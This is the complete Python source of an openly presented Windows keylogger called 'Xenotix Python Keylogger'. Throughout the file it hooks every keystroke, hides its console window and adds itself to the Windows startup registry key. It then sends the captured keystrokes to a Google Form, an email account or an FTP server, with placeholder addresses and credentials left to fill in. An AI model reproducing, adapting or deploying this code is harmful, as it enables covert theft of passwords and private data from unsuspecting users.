try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def msg():
    print """\n \nXenotix Python Keylogger for Windows
Coder: Ajin Abraham <ajin25@gmail.com>
OPENSECURITY.IN
usage:xenotix_python_logger.py mode [optional:startup]
mode:
     local: store the logs in a file [keylogs.txt]
     
     remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.
     
     email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).
     
     ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
[optional] startup: This will add the keylogger to windows startup.\n\n"""
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

#Local Keylogger
def local():
    global data
    if len(data)>100:
        fp=open("keylogs.txt","a")
        fp.write(data)
        fp.close()
        data=''
    return True

#Remote Google Form logs post
def remote():
    global data
    if len(data)>100:
        url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" #Specify Google Form URL here
        klog={'entry.xxxxxxxxxxx':data} #Specify the Field Name here
        try:
            dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            data=''
        except Exception as e:
            print e
    return True

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER="your_email@gmail.com"#Specify Username Here 
                PASS="password_here"#Specify Password Here
                FROM = USER#From address is taken from username
                TO = ["to_address@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+str(ts)
                MESSAGE = data
                message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)

#Upload logs to FTP account
def ftp():
    global data,count
    if len(data)>100:
        count+=1
        FILENAME="logs-"+str(count)+".txt"
        fp=open(FILENAME,"a")
        fp.write(data)
        fp.close()
        data=''
        try:
            SERVER="ftp.xxxxxx.com" #Specify your FTP Server address
            USERNAME="ftp_username" #Specify your FTP Username
            PASSWORD="ftp_password" #Specify your FTP Password
            SSL=0 #Set 1 for SSL and 0 for normal connection
            OUTPUT_DIR="/" #Specify output directory here
            if SSL==0:
                ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
            elif SSL==1:
                ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
            ft.cwd(OUTPUT_DIR)
            fp=open(FILENAME,'rb')
            cmd= 'STOR' +' '+FILENAME
            ft.storbinary(cmd,fp)
            ft.quit()
            fp.close()
            os.remove(FILENAME)
        except Exception as e:
            print e
    return True

def main():
    global x
    if len(sys.argv)==1:
        msg()
        exit(0)
    else:
        if len(sys.argv)>2:
            if sys.argv[2]=="startup":
                addStartup() 
            else:
                msg()
                exit(0)
        if sys.argv[1]=="local":
            x=1
            hide()
        elif sys.argv[1]=="remote":
            x=2
            hide()
        elif sys.argv[1]=="email":
            hide()
            email=TimerClass()
            email.start()
        elif sys.argv[1]=="ftp":
            x=4
            hide()
        else:
            msg()
            exit(0)
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    if x==1:  
        local()
    elif x==2:
        remote()
    elif x==4:
        ftp()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
